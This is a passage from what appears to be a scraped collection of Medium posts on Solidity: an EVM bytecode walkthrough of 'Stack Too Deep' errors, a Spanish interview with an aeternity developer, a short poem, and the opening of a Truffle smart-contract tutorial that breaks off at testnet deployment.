errors and warnings, and so I go to the Run tab and hit Deploy.Then, I extend the list for the SimpleFunction contract, and enter a single value in the box in front of logArg. I press the button and check the output in the console:As you can see, I entered the value 7, and that was returned as the only element in the logs. Although logs are worth another post, there are a few things I should mention here.This is the JSON-formatted logs object of this call:logs [{  \"from\": \"0xef55bfac4228981e850936aaf042951f7b146e41\",  \"topic\": \"0xfcf771399d75a67a6d0e730ae98d34c40b6bfe6ebf8053b98ddf4da8c2706250\",  \"event\": \"LogValue\",  \"args\": {    \"0\": \"7\",    \"length\": 1  }}Logs are created by the emit keyword in solidity, which raise a solidity event and correspond to LOGn opcodes.Logs can be filtered by client-side applications running off-chain. A filter is a condition on any of the topics available in the log.A log always has a topic 0, which is an encoding of the event\u2019s signature.Further topics can be created by making an argument indexed. There can be up to 3 indexed arguments. The remaining ones are considered event dataIn this simple example, we can easily identify that there is only one topic (\"0xfcf771399d75a67a6d0e730ae98d34c40b6bfe6ebf8053b98ddf4da8c2706250\") and that the data are displayed as part of the args member of the log object. We can also verify the code is working as expected.Let\u2019s now test the limits of this contract and change the function to accept the maximum number of arguments.pragma solidity ^0.4.24;contract TestStackError {  event LogValue(uint);  function logArg(uint a1, uint a2, uint a3, uint a4,\tuint a5, uint a6, uint a7, uint a8,\tuint a9, uint a10, uint a11, uint a12,\tuint a13, uint a14, uint a15, uint a16  ) public {    emit LogValue(a16);  }}I have 16 input variables, no output variables, therefore I only need to use 16 stack slots. I invoke the function passing the values 1 to 16 and emit the last value. I check the logs and see the value 16. Brilliant, this works!Then, I make a very small change to my contract: I log the first argument instead:Wait, what?! Simply logging a different argument has turned a perfectly fine contract into a \u201cStack Too Deep\u201d error. Wow, what\u2019s going on in here?This is not something Solidity can elucidate. At that level, the change looks perfectly harmless. I need to go down into the EVM bytecode to understand what is going on. But before I do that, I want to make another test, to gather some clues. I create a third version of this contract, but logging a2 instead:pragma solidity ^0.4.24;contract TestStackError {  event LogValue(uint);  function logArg(uint a1, uint a2, uint a3, uint a4,\tuint a5, uint a6, uint a7, uint a8,\tuint a9, uint a10, uint a11, uint a12,\tuint a13, uint a14, uint a15, uint a16  ) public {    emit LogValue(a2);  }}This works and logs the correct value. The same happens when I log a3. I hypothesize then that all the arguments between a2 and a16 can correctly be logged.The resulting opcodes are in these three files:log(a2)log(a3)log(a16)I compared all the 3 logs between themselves, and the very first thing that struck me was that they all differed in size (number of lines). The second thing is that they are remarkably equal until line 237, with only one exception. The code after this line is very different and apparently unpredictable. However, since that seems to come after the function has returned, I will simply ignore it.Then I focused on the one difference between line 237, occurring at line 198. I was happy to confirm an idea that I had thought could explain the stack too deep error \u2014 that in some place of the code we would logically need to call some non-existing DUP or SWAP opcode. That indeed seems to be the case here: all 3 versions are the same until line 237, except for one single difference on line 198:log(a2): DUP16log(a3): DUP15log(a16): DUP2The opcodes DUPn duplicate the value at the nth level of the stack. There are only 16 such opcodes, from DUP1 to DUP16. DUP1 pushes to the stack a copy of the value currently at the top, and DUP16 copies the 16th highest value in the stack. There is an evident relationship between the place of the variable in the argument list and the value of DUPn in this line, and if I extrapolate it to the case log(a1), this rule implies we will need an opcode DUP17. But such an opcode does not exist, it points to a value lower in the stack than we can reach, which justifies the error message \u201cStack Too Deep\u201d.Satisfied with this, my natural curiosity asks the question: what role is this DUP opcode performing here? What is its purpose?Bytecode is intimidating. The last time I looked at assembly code with some level of intention of understanding it was in my teens, playing with the Spectrum\u2019s Z80 processor. I have not any experience of doing it with the EVM, so I don\u2019t plan to parse 200 lines of an assembly-like listing in my head. But Remix does offer quite good tools in this respect. In the debug tab, we can replay the transaction opcode by opcode, and at a glance see the contents of the stack, the memory and the storage, among others.Before I proceed, I\u2019d like to point you towards this series of posts in the Zeppelin blog by Alejandro Santander on the structure of assembly EVM code. It is a priceless introduction to EVM assembly, and will save me from having to explain the boilerplate. Another extremely useful link is this list of EVM opcodes, that is my favourite reference to find the functionality of each opcode. I highly recommend it.There is not much to this function, and most of the bytecode is repetitive. There are 17 occurrences of the opcode CALLDATALOAD. The first one appears in the first block of the code, before the function dispatch. It checks whether the calldata is too short (line 12), in which case the function would revert. After this, it compares the function selector to those of the methods known to the contract (in this case, only one: e898288f) and if it matches any, directs the flow to the address that implements that function. Otherwise, the call reverts.In this case, the code has called the only existing function and so the flow jumps to address 70 (line 25) to process it.The remaining 16 instances of CALLDATALOAD are exactly the number or arguments we have, they appear at exactly 9 lines intervals, and are probably responsible for processing each argument to the function. So, I ran over these lines with the Remix debugger and observed that they do load each successive argument onto the stack (I\u2019m not worried with how exactly those 9 opcodes copy these data). These are followed by 3 POP instructions that clear the part of the stack we no longer need (which was used to calculate the position in the call data of the next argument to be read). At this point, the top of the stack holds the 16th argument, the second element holds the 15th argument and so on. The 16th element of the stack is, at this stage, the first argument. This is followed by the return address of the function (0x109) and the function selector.The code then pushes into the stack the 32 byte identifier of topic 0 fcf771399d75a67a6d0e730ae98d34c40b6bfe6ebf8053b98ddf4da8c2706250, which pushes the first input out of the top 16 elements of the stack, and follows this with the DUP opcode that puts at the top of the stack the argument for the log event (eg a2 or a16).The next 20 lines or so prepare the memory to hold the argument of the log event at memory position 0x80, and guarantee the stack has in its top two positions this address and the length of the data (0x20). Then, it calls the opcode LOG1, which emits a log event with one single argument and one topic, using the data at the top 3 positions in the stack:0: 0x00000000000000000000000000000000000000000000000000000000000000801: 0x00000000000000000000000000000000000000000000000000000000000000202: 0xfcf771399d75a67a6d0e730ae98d34c40b6bfe6ebf8053b98ddf4da8c2706250There are in total five LOGn opcodes, LOG0 to LOG4, where n indicates the number of topics in the log. Topic0 is always the identifier of the event type, defined by the hash of its signature, but it can be skipped by using LOG0, which specifies an anonymous event. Each additional topic requires another slot in the stack, pushing that many more arguments out of the reachable list.This analysis shows that an event with one argument prevents one variable of being used, because topic0 is placed in the stack before the event data. This raises a couple of questions:What if we have more topics? Are they placed in the stack before the data as well?And what is the impact of more event arguments, are they PUSHed after or before the topic?To test that, I\u2019ll change the contract again. Notice that events can have any number of arguments, and up to 3 of them can be indexed. Indexed arguments become topics, while the others are lumped in the data section. My hypothesis, at this stage, is that each topic (indexed argument) will be placed in the stack before the data, and so will prevent the access to more of the early variables.In my tests, I covered several scenarios, but they all lead to the same conclusion so I will save you the minute details. I will just illustrate with another interesting and counter-intuitive case, and then draw final conclusions.First, let\u2019s try this version of the contract, where the event has one indexed value and two non-indexed ones.pragma solidity ^0.4.24;contract TestStackError {  event LogValue(uint indexed a1, uint a2, uint a3);  function logArg(uint a1, uint a2, uint a3, uint a4,\tuint a5, uint a6, uint a7, uint a8,\tuint a9, uint a10, uint a11, uint a12,\tuint a13, uint a14, uint a15, uint a16  ) public {    emit LogValue(a2, a3, a4);  }}The bytecode for this function (after the function dispatch) until the event is emitted is this:265 JUMPDEST266 DUP15267 PUSH32 a5397a5faa0ec7cfb89428503b91a13bbd737592f7561e6773fa3e1458c8735c300 DUP16301 DUP16302 PUSH1 40304 MLOAD305 DUP1306 DUP4307 DUP2308 MSTORE309 PUSH1 20311 ADD312 DUP3313 DUP2314 MSTORE315 PUSH1 20317 ADD318 SWAP3319 POP320 POP321 POP322 PUSH1 40324 MLOAD325 DUP1326 SWAP2327 SUB328 SWAP1329 LOG2The opcode that emits the event is LOG2. This means we have two topics, one the default topic0 (ie the event signature) and the other the only indexed argument in the event signature. The remaining two values are grouped in memory.If we check Ethervm for this opcode, we see that the last value read from stack, and the first to be pushed onto it, is topic1, that is, the indexed argument \u2014 a2. Initially, this is placed at position 15 of the stack. The opcode DUP15places a copy of the value at the top of the stack, and consequently pushes all the other arguments down. From now on, for example, a2 is in position 16, and a1 is in position 17.The next instruction pushes a 32-bit value to the stack, that simply corresponds to topic 0. This value is hardcoded. This also has the effect of pushing again the arguments down. Now, a2 is in position 17.The following instructions are two DUP16 opcodes. The first one copies the value at position 16, which is currently the third argument, a3. But since this pushes a new element onto the stack, when the next opcode is called DUP16will copy the fourth argument to the function, a4. At this stage, at the top of the stack we have the data for the event (two words), the indexed argument and the event unique identifier.The following lines copy the first two values to memory:(302\u2013305): places the contents of memory 0x40 at the top of the stack, twice. This is the position in memory where the event data will be located (and is 0x80 in my execution).(306\u2013308): places the first data word at the first free position in memory (ie places a3 in position 0x80)(309\u2013311):places the next free position in memory at the top of the stack(312\u2013314): places the second data word at the next free position in memory (ie places a4in position 0xa0)(315\u2013321): calculates the next free position in memory and leaves it at the top of the stack, after eliminating values that are no longer needed.(322\u2013327): finds the length of the data submitted to the event, by subtracting the initial address of next free position in memory from the current value of that position (held at the top of the stack).(328): reorders the first two elements of the stack, making the first element the beginning of the event data, and the second address the length of this data.(329): finally calls the logging opcode.I gave this detailed explanation so that you can understand how this process works, if you wish. In that case, perhaps you can now explain the next apparent oddity. Change only the signature of the event to:event LogValue(uint a1, uint indexed a2, uint a3);Yep, another Stack Too Deep error. Can you see what is causing it?\u2026\u2026\u2026\u2026\u2026\u2026The bytecode does not change much. We still have the same number of topics, so the opcode at the end will still be LOG2. And it still expects to receive its arguments in the same order, that is, the topics first, then the data.Now, the second topic must be loaded first, so a3 would be the first value to be pushed to the stack with a DUP14. Then topic0 would be pushed. Now, the EVM would place at the top of the stack the two arguments it needs to store in memory, a2 and a4. These were originally at positions 15 and 13. However, the EVM has made two pushes already, which makes these positions 17 and 15. It is impossible to place the first value in the stack (DUP17 does not exist) and so the compilation errors.So now that we understand this, I try changing just one more thing, the log function to:emit LogValue(a3, a2, a4);This code works, since it corresponds very closely to the last block before I changed the order of the indexed arguments. In that code, the indexed value of the event was called with a2. In this version, it is still a2 that is passed to that position, and the others remain the same. The bytecode explanation is virtually the same.ConclusionThis has been a long post. If you have arrived this far, it is worth leaving you with an organized view of what is happening, so that you can go back to your programs and think if your \u201cStack Too Deep\u201d errors could have been caused by similar behaviour. Although this post covers only the case of emitting events, other functions will use other opcodes, but will still have the same logic, in copying the function arguments (or intermediate values) to the stack when some computation is needed.So here are some streamlined notes to keep in mind:When a function is called, a stack frame is created. This includes, from bottom to top:the function selectorthe return addressthe leftmost value-type argument of the function\u2026the rightmost value-type argument of the function\u201cStack Too Deep\u201d errors depend on the central opcode of an action (eg arithmetic, hashing, calling another function, emitting events, etc.)If these central operations are performed on pure function arguments, the order in which they are passed to the function may decide the occurrence of a \u201cStack Too Deep\u201d error. (Stack slots can also be used for intermediate calculations and local variables, but I intend to study those in a later post.)It is crucial to know the number and order of the arguments for the opcode. These arguments are typically read from the stack (the only exception is the PUSH opcode).Opcode arguments have to be pushed to the stack before executing the opcode. Each PUSH moves the function arguments down at least one slot. The function arguments deeper in the stack are the ones that were processed first, that is, the leftmost ones in the function signature.If some of the function arguments are not used in that opcode operation, then they should come first in the function signature, to reduce the chances that opcode arguments will be off-reach when they need to be stacked.Opcodes use arguments at different levels in the stack. Deeper levels are pushed first. If an argument is pushed after another, it should appear in the function signature after the former as well, otherwise it would push the other one down the stack before it could be used. Example:Consider an event with two indexed arguments t1 and t2 in this order, that is called inside a function with several arguments, among which a1 coming before a2If the event is emitted with t1 = a1 and t2 = a2, the opcode LOG3 will be called.Before calling this opcode, t2 = a2 will be pushed first into the stack.This will push a1 down and put it at risk of being unreachable when the time comes to push the value of t1 = a1.This would be avoided if a1 came after a2 in the function signature, since it would be higher in the stack than a2. Assuming a2 was reachable when it was pushed, so would be a1 afterwards.The above post concentrated on LOGn opcodes only, in particular on versions requiring 3 or 4 arguments in the stack. A more difficult case will be calling functions in other contracts or libraries, since the opcodes CALLand DELEGATECALL take 7 or 6 input arguments each, with a lot more possibilities of interaction between the opcode and function arguments.I hope this gives you some clues on how to debug and handle \u201cStack Too Deep\u201d errors. There is a lot more to say, but that will have to wait for other opportunities.Until next time.Alexandre Pinto \u2014 Blockchain developer at Artos (Aventus Ecosystem Party)Alex is a software engineer at Artos, our ecosystem partner, working on the blockchain engineering team. He has 20 years of experience working in technology, completing a PhD in Computer Science as well as a post-doctorate in Cryptography. As part of his research, Alex has published papers on Kolmogorov Complexity, Cryptography, Database Anonymization and Code Obfuscation.Pinto also spent seven years lecturing at the University Institute of Maia, including directing the degree programmes for BSc Computer Science and Information Systems and Software.This article was originally posted on his blog.Since you are here, we would love if you connected with us on Telegram,Reddit, Twitter, Facebook, Youtube, Instagram and LinkedIn.Also, we have started a LinkedIn Group for ticketing developers/other developers to engage, join us and start a conversation.Learn Solidity - Best Solidity Tutorials (2019) | gitconnectedThe top 14 Solidity tutorials. Courses are submitted and voted on by developers, enabling you to find the best Solidity\u2026gitconnected.com", "responses": 0, "tags": ["Ethereum", "Coding", "Programmers", "Blockchain", "Solidity"]}, {"title": "Sintaxis, Scams y Solidity: Una Entrevista con Hans Svensson", "post_link": "https://blog.aeternity.com/sintaxis-scams-y-solidity-una-entrevista-con-hans-svensson-356ebb3c1d13?source=search_post", "author_name": "\u00e6ternity", "author_link": "https://blog.aeternity.com/@aeternity_", "publish_date": "2019-01-11", "last_modified_date": "2019-01-11", "readtime": "3.07", "claps": 0, "voters": 0, "content": "Sintaxis, Scams y Solidity: Una Entrevista con Hans SvenssonHans comparti\u00f3 su punto de vista sobre la programaci\u00f3n funcional, consensus y si blockchain realmente cambiar\u00e1 o no el mundo.\u00e6ternityFollowJan 11 \u00b7 4 min readCon m\u00e1s de 15 a\u00f1os de experiencia en la programaci\u00f3n Erlang, Hans Svensson es un especialista en verificaci\u00f3n de modelos para programas concurrentes. Ha implementado los protocolos CAN y LIN y ha trabajado como experto en QuickCheck, probando SSL, Riak, protocolos automotrices, protocolos de telecomunicaciones y varios otros sistemas distribuidos. Ha implementado la sem\u00e1ntica de Erlang y conoce los rincones de VM. Como autor de varios libros con concurrencia como tema unificador, tiene un doctorado en pruebas, verificaci\u00f3n de modelos y verificaci\u00f3n de programas Erlang. Hans trae su naturaleza relajada pero dedicada al proyecto \u00e6ternity y es conocido por muchos por su deseo y capacidad de seguir adelante. Recientemente, nos sentamos con \u00e9l para preguntarle sobre su punto de vista sobre la programaci\u00f3n funcional, consensus y si Blockchain realmente cambiar\u00e1 el mundo.\u00bfQu\u00e9 te trajo al equipo?Al tener una formaci\u00f3n acad\u00e9mica, haber trabajado con sistemas distribuidos y haber impartido cursos de criptograf\u00eda, fue natural para m\u00ed tener al menos un breve inter\u00e9s en el surgimiento de la tecnolog\u00eda blockchain. Sin embargo, durante varios a\u00f1os estuve demasiado ocupado con el trabajo y la familia como para explorarlo en detalle.Esto cambi\u00f3 cuando me presentaron el proyecto \u00e6ternity. Parec\u00eda una oportunidad incre\u00edble para construir la siguiente generaci\u00f3n blockchain en Erlang.\u00bfQu\u00e9 es lo que m\u00e1s te interesa de blockchain?Encuentro la naturaleza descentralizada muy interesante.Me gusta la idea de que blockchain simplemente existe; nadie est\u00e1 \u201cejecut\u00e1ndola\u201d.S\u00ed, por supuesto que hay una comunidad, y la mayor\u00eda de los cambios que experimenta incluyen alguna versi\u00f3n de consensus. Pero, al final del d\u00eda, es el propio c\u00f3digo que ejecuta la mayor\u00eda de los participantes lo que define la cadena.\u00bfCrees que blockchain tiene el potencial de cambiar el mundo?Esta es una pregunta que a menudo recibo de amigos cuando escuchan que estoy involucrado en un proyecto blockchain. Por lo general, les digo que creo que algunas, quiz\u00e1s unas pocas, de las blockchains existentes persistir\u00e1n y ser\u00e1n bloques de construcci\u00f3n realmente \u00fatiles en la tecnolog\u00eda futura. Sin embargo, no estoy tan seguro de que, en s\u00ed misma, cambiar\u00e1 el mundo. En cierto sentido, podr\u00eda hacerlo porque permite que se construya sobre ella un servicio innovador. Pero queda por verse c\u00f3mo eso podr\u00eda suceder.\u00bfCu\u00e1l es tu cosa favorita de Erlang como lenguaje de programaci\u00f3n?\u00bfSolo puedo elegir una? Para m\u00ed, tiene que ser su sintaxis moderna y concisa\u2026 \u00a1S\u00f3lo bromeo! Pero en serio, aparte de su incomparable modelo de concurrencia, lo que normalmente me gusta m\u00e1s es que puedo ser realmente productivo. El lenguaje funcional y din\u00e1micamente escrito tambi\u00e9n ayuda mucho. Habiendo escrito programas imperativos largos y luchado contra el comprobador de tipos de Haskell, esta caracter\u00edstica es muy valiosa para m\u00ed.\u00bfCu\u00e1l es el mayor desaf\u00edo de tu trabajo en este momento?El mayor desaf\u00edo para \u00e6ternity es la aceptaci\u00f3n. Claro, podemos desarrollar y mejorar muchas cosas. Pero necesitamos educar a las personas y hacer que comprendan y amen los conceptos que ya tenemos. Nuestro lenguaje contractual es un excelente ejemplo de esto. Es diferente en comparaci\u00f3n con Solidity, por ejemplo. Pero es diferente por una raz\u00f3n y, si me preguntas, es diferente de una manera muy buena. Hay menos posibilidades de que te dispares en el pie con Sophia, pero a\u00fan puedes hacerlo si realmente lo deseas.Al final me gusta que hayamos hecho un lenguaje m\u00e1s seguro sin limitar su expresividad.\u00bfQu\u00e9 consejo le dar\u00edas a alguien sobre esta tecnolog\u00eda?Este negocio est\u00e1 lleno de personas paranoicas: personas que pueden llamar a algo una estafa r\u00e1pidamente en cuanto ven algo que no entienden completamente. Probablemente por buenas razones, ya ha habido demasiados proyectos dudosos. Pero mi consejo ser\u00eda tomar tres respiraciones profundas, asegurarte de que entiendes lo que est\u00e1s viendo y tomar tus propias decisiones sobre las cosas.Fuera del trabajo, \u00bfc\u00f3mo podr\u00eda un amigo describir tu personalidad?Algunos amigos dir\u00edan que me importa demasiado el f\u00fatbol, \u200b\u200bpero es bueno tener algo no t\u00e9cnico en el que concentrarme de vez en cuando. ;)\u00bfInteresado en \u00e6ternity? S\u00edguenos:GitHub | Forum | Reddit | Bitcointalk | Telegram | Twitter | Facebook | Mail", "responses": 0, "tags": ["Blockchain", "Aeternity", "Espa\u00f1ol", "Spanish", "Github"]}, {"title": "SOLIDITY", "post_link": "https://medium.com/everything-comes/solidity-121fe279c38f?source=search_post", "author_name": "Stephen C. Rose", "author_link": "https://medium.com/@stephencrose", "publish_date": "2019-05-05", "last_modified_date": "2019-05-05", "readtime": "0.43", "claps": 20, "voters": 2, "content": "COMING AND GOINGSOLIDITYStephen C. RoseFollowMay 5 \u00b7 1 min readSolidity I\u2019ll give you solid hereOh yes I didI put my finger through itIt\u2019s yours not mine+Solidity you say it must appearOK OKWhy are you so insistentOK that\u2019s fine+You say you want to write it up just nowWhy such a rushYou\u2019re thinking it might vanishThat\u2019s a good sign", "responses": 0, "tags": ["Rhyme", "Electrons", "Particles", "Waves", "Now"]}, {"title": "The Hitchhiker\u2019s Guide to Smart Contracts in Ethereum", "post_link": "https://medium.com/zeppelin-blog/the-hitchhikers-guide-to-smart-contracts-in-ethereum-848f08001f05?source=search_post", "author_name": "Manuel Araoz", "author_link": "https://medium.com/@maraoz", "publish_date": "2016-07-29", "last_modified_date": "2019-02-13", "readtime": "12.3", "claps": 6127, "voters": 1122, "content": "The Hitchhiker\u2019s Guide to Smart Contracts in EthereumManuel AraozFollowJul 29, 2016 \u00b7 13 min readUpdated Oct 6th 2017, for Truffle v3.4.11 and Solidity v0.4.15.I\u2019ve been working with smart contracts for 4 years, mainly in the Bitcoin blockchain. Some projects I participated in are Proof of Existence, bitcore, and Streamium. In the past months, I\u2019ve been exploring and working with the Ethereum platform.I\u2019ve decided to compile a short guide to ease the way of future programmers learning Ethereum smart contract development. I\u2019ve divided the guide in two sections: how to get started building smart contracts in Ethereum, and a quick note on smart contract security.Getting started with Smart Contracts on Ethereum0. Basic ConceptsThis guide assumes you have a basic level of technical understanding on how cryptocurrencies and blockchains work. If you don\u2019t, I recommend skimming over Andreas Antonopoulos\u2019 Mastering Bitcoin book, Consensys\u2019 \u201cJust Enough Bitcoin for Ethereum\u201d guide, or at least watching this short video by Scott Driscoll. To continue ahead you should know what a public and private key are, why a blockchain needs miners, how decentralized consensus is reached, what a transaction is, and the concepts of transaction scripting and smart contracts.Two other important and related concepts you\u2019ll need to understand before working with Ethereum are the Ethereum Virtual Machine and gas.Ethereum was designed as a smart contract platform. Its origin is actually linked to a critique made by Vitalik Buterin on bitcoin as a very limited smart contract platform. The Ethereum Virtual Machine (EVM) is where smart contracts run in Ethereum. It provides a more expressive and complete language than bitcoin for scripting. In fact, it is a Turing Complete programming language. A good metaphor is that the EVM is a distributed global computer where all smart contracts are executed.Given that smart contracts run in the EVM, there must be a mechanism to limit the resources used by each contract. Every single operation that is executed inside the EVM is actually simultaneously executed by every node in the network. This is why gas exists. An Ethereum transaction contract code can trigger data reads and writes, do expensive computations like using cryptographic primitives, make calls (send messages) to other contracts, etc. Each of these operations have a cost measured in gas, and each gas unit consumed by a transaction must be paid for in Ether, based on a gas/Ether price which changes dynamically. This price is deducted from the Ethereum account sending the transaction. Transactions also have a gas limit parameter that is an upper bound on how much gas the transaction can consume, and is used as a safe-guard against programming errors that could deplete an account\u2019s funds. You can read more about gas here.1. Setting up your environmentSo, you know the basics, let\u2019s set everything up to code! To start developing Ethereum apps (or DApps, for decentralized applications, as many people like to call them), you\u2019ll need a client to connect to the network. It will act as your window to the distributed network, and provide a view of the blockchain, where all the EVM state is represented.There are various compatible clients for the protocol, the most popular being geth, a Go language implementation. However, it\u2019s not the most developer-friendly. The best option I\u2019ve found is the testrpc node (yes, the name sucks). Trust me, it will save you a lot of time. Install it and run it (you may need to prepend sudo depending on your setup):$ npm install -g ethereumjs-testrpc$ testrpcYou should run testrpc in a new terminal and leave it running while you develop. Each time you run testrpc, it will generate 10 new addresses with simulated test funds for you to use. This is not real money and you\u2019re safe to try anything with no risk of losing funds.The most popular language for writing smart contracts in Ethereum is Solidity, so we\u2019ll be using that. We\u2019re also using the Truffle development framework, which helps with smart contract creation, compiling, deployment and testing. Let\u2019s start (again, you may need to prepend sudo depending on your setup):# First, let's install truffle$ npm install -g truffle# let's setup our project$ mkdir solidity-experiments$ cd solidity-experiments/$ truffle init Truffle will create all the files for an example project, including contracts for MetaCoin, a sample token contract. You should be able to compile the example contracts by running truffle compile. Then, to deploy the contracts to the simulated network using the testrpc node we have running, you need to run truffle migrate:$ truffle compileCompiling ConvertLib.sol...Compiling MetaCoin.sol...Compiling Migrations.sol...Writing artifacts to ./build/contracts$ truffle migrateUsing network 'development'.Running migration: 1_initial_migration.js  Deploying Migrations...  ... 0x686ed32f73afdf4a84298642c60e2002a6d0d736a5478cc8cb22a655ac018a67  Migrations: 0xa7edbac1156f98907a24d18df8104b5b1bd7027cSaving successful migration to network...  ... 0xe3bf1e50d2262d9ffb015091e5f2974c8ebe0d6fd0df97a7dbcde8a0e51c694aSaving artifacts...Running migration: 2_deploy_contracts.js  Deploying ConvertLib...  ... 0x2e0e6718f01d0da6da2ada13d6e4ad662c5a20e784e04c404e9d4ef1d392bdae  ConvertLib: 0xf4388ce4d4ce8a443228d65ecfa5149205db049f  Linking ConvertLib to MetaCoin  Deploying MetaCoin...  ... 0xb03a3cde0672a2bd4dda6c01dd31641d95bd680c4e21162b3370ed6db7a5620d  MetaCoin: 0x4fc68713f7ac86bb84ac1ef1a09881a9b8d4100fSaving successful migration to network...  ... 0xb9a2245c27ff1c6506c0bc6349caf86a31bc9f700388defe04566b6d237b54b6Saving artifacts...Note to Mac OS X users: Truffle is sometimes confused by .DS_Store files. If you get an error mentioning one of those files, just delete it.We just deployed the sample contracts to our testrpc node. Wohoo! That was easy, right? Time to create our own contract now!2. Writing your first Ethereum smart contractIn this guide we\u2019ll be writing a simple Proof of Existence smart contract. The idea is to create a digital notary that stores hashes of documents as proofs of their existence. Use truffle create contract to get started:$ truffle create contract ProofOfExistence1Now open contracts/ProofOfExistence1.sol in your favorite text editor (I use vim with Solidity syntax highlighting), and paste this initial version of the code:pragma solidity ^0.4.15;// Proof of Existence contract, version 1contract ProofOfExistence1 {  // state  bytes32 public proof;  // calculate and store the proof for a document  // *transactional function*  function notarize(string document) {    proof = proofFor(document);  }  // helper function to get a document's sha256  // *read-only function*  function proofFor(string document) constant returns (bytes32) {    return sha256(document);  }}We\u2019ll start with something simple but incorrect and move towards a better solution. This is a definition of a Solidity contract, which is like a class in other programming languages. Contracts have state and functions. It is important to distinguish two kinds of functions that can appear in a contract:Read-only (constant) functions: functions that don\u2019t perform any state changes. They only read state, perform computations, and return values. As these functions can be resolved locally by each node, they cost no gas. Marked with the keyword constant.Transactional functions: functions that perform a state change in the contract or move funds. As these changes need to be reflected in the blockchain, transactional function execution requires sending a transaction to the network and spending gas.Our contract above has one of each kind, marked in the documentation. We\u2019ll see how the kind of function we\u2019re using with modifies how we interact with the smart contract in the next section.This simple version only stores one proof at a time, using the data type bytes32, or 32 bytes, which is the size of a sha256 hash. The transactional function notarize allows one to store the hash of a document in our smart contract\u2019s state variable proof. Said variable is public, and is the only way a user of our contract has to verify if a document has been notarized. We\u2019ll do that ourselves shortly, but first\u2026Let\u2019s deploy ProofOfExistence1 to the network! This time, you\u2019ll have to edit the migration file (migrations/2_deploy_contracts.js) to make Truffle deploy our new contract. Replace the contents with the following:var ProofOfExistence1 = artifacts.require(\"./ProofOfExistence1.sol\");module.exports = function(deployer) {  deployer.deploy(ProofOfExistence1);};To run this migration again, you\u2019ll need to use the reset flag, to make sure it runs again.truffle migrate --resetMore on how Truffle migrations work can be found here.3. Interacting with your smart contractNow that our contract is deployed, let\u2019s play with it! We can send messages to it via function calls and read its public state. We\u2019ll use the Truffle console for that:$ truffle console// get the deployed version of our contracttruffle(default)> var poe = ProofOfExistence1.at(ProofOfExistence1.address)// and print its address truffle(default)> poe.address0x3d3bce79cccc331e9e095e8985def13651a86004// let's register our first \"document\"truffle(default)> poe.notarize('An amazing idea'){ tx: '0x18ac...cb1a',  receipt:    { transactionHash: '0x18ac...cb1a',     ...   },  logs: [] }// let's now get the proof for that documenttruffle(default)> poe.proofFor('An amazing idea')0xa3287ff8d1abde95498962c4e1dd2f50a9f75bd8810bd591a64a387b93580ee7// To check if the contract's state was correctly changed:truffle(default)> poe.proof()0xa3287ff8d1abde95498962c4e1dd2f50a9f75bd8810bd591a64a387b93580ee7// The hash matches the one we previously calculatedFirst thing we do is obtain a representation of our deployed contract and store it in a variable called poe.We then call the transactional function notarize, which involves a state change. When we call a transactional function, we get a Promise that resolves to a transaction object, not what the actual function returns. Remember that to change the EVM state we need to spend gas and send a transaction to the network. That\u2019s why we get a transaction information object as the result of the Promise, referring to the transaction that did this state change. In this case, we are not interested in the transaction id, so we just discard the Promise. When writing a real app, we\u2019ll want to save it to check the resulting transaction and catch errors.Next, we call the read-only (constant) function proofFor. Remember to mark your read-only functions with the keyword constant, or else Truffle will try to craft a transaction to execute them. This is a way to tell Truffle that we\u2019re not interacting with the blockchain but just reading from it. By using this read-only function, we obtain the sha256 hash of the \u2018An amazing idea\u2019 \u201cdocument\u201d.We now need to contrast this with the state of our smart contract. To check if the state changed correctly, we need to read the proof public state variable. To get the value of a public state variable, we can call a function of the same name, which returns a Promise of its value. In our case, the output hash is the same, so everything worked as expected :)For more info on how to interact with contracts, read this section of the Truffle documentation.As you can see from the snippet above, our first version of the Proof of Existence smart contract seems to be working! Good work! It\u2019s only good for registering one document at a time, though. Let\u2019s create a better version.4. Iterating the contract codeLet\u2019s change the contract to support multiple document proofs. Copy the original file with the name contracts/ProofOfExistence2.sol and apply these changes. The main changes are: we change the proof variable into a bytes32 array and call it proofs, we make it private, and we add a function to check if a document has already been notarized by iterating that array.pragma solidity ^0.4.15;// Proof of Existence contract, version 2contract ProofOfExistence2 {  // state  bytes32[] private proofs;  // store a proof of existence in the contract state  // *transactional function*  function storeProof(bytes32 proof) {    proofs.push(proof);  }// calculate and store the proof for a document  // *transactional function*  function notarize(string document) {    bytes32 proof = proofFor(document);    storeProof(proof);  }// helper function to get a document's sha256  // *read-only function*  function proofFor(string document) constant returns (bytes32) {    return sha256(document);  }// check if a document has been notarized  // *read-only function*  function checkDocument(string document) constant returns (bool) {    bytes32 proof = proofFor(document);    return hasProof(proof);  }  // returns true if proof is stored  // *read-only function*  function hasProof(bytes32 proof) constant returns (bool) {    for (uint256 i = 0; i < proofs.length; i++) {      if (proofs[i] == proof) {        return true;      }    }    return false;  }}Let\u2019s interact with the new functions: (remember to update migrations/2_deploy_contracts.js to include the new contract and run truffle migrate --reset)// deploy contractstruffle(default)>  migrate --reset// Get the new version of the contracttruffle(default)> var poe = ProofOfExistence2.at(ProofOfExistence2.address)// let's check for some new document, and it shouldn't be there.truffle(default)> poe.checkDocument('hello')false// let's now add that document to the proof storetruffle(default)> poe.notarize('hello'){ tx: '0x1d2d...413f',  receipt: { ... },  logs: []}// let's now check again if the document has been notarized!truffle(default)> poe.checkDocument('hello')true// success!// we can also store other documents and they are recorded tootruffle(default)> poe.notarize('some other document');truffle(default)> poe.checkDocument('some other document')trueThis version is better than the first, but still has some problems. Note that every time we want to check if a document was notarized, we need to iterate through all existing proofs. This makes the contract spend more and more gas on each check as more documents are added. A better structure to store proofs is a map. Luckily, Solidity supports maps, and calls them mappings. Another thing we\u2019ll improve in this version is removing all that extra comments marking read-only or transactional functions. I think you get it by now :)Here\u2019s the final version, which should be pretty easy to understand because you followed along previous versions:pragma solidity ^0.4.15;// Proof of Existence contract, version 3contract ProofOfExistence3 {  mapping (bytes32 => bool) private proofs;  // store a proof of existence in the contract state  function storeProof(bytes32 proof) {    proofs[proof] = true;  }  // calculate and store the proof for a document  function notarize(string document) {    var proof = proofFor(document);    storeProof(proof);  }  // helper function to get a document's sha256  function proofFor(string document) constant returns (bytes32) {    return sha256(document);  }  // check if a document has been notarized  function checkDocument(string document) constant returns (bool) {    var proof = proofFor(document);    return hasProof(proof);  }  // returns true if proof is stored  function hasProof(bytes32 proof) constant returns(bool) {    return proofs[proof];  }}That looks good enough. And it works exactly as the 2nd version. To try it out, remember to update the migration file and run truffle migrate --reset again. All the code in this tutorial can be found in this GitHub repo.5. Deploying to the real testnet networkOnce you\u2019ve tested your contract extensively using testrpc in the simulated network, you\u2019re ready to try 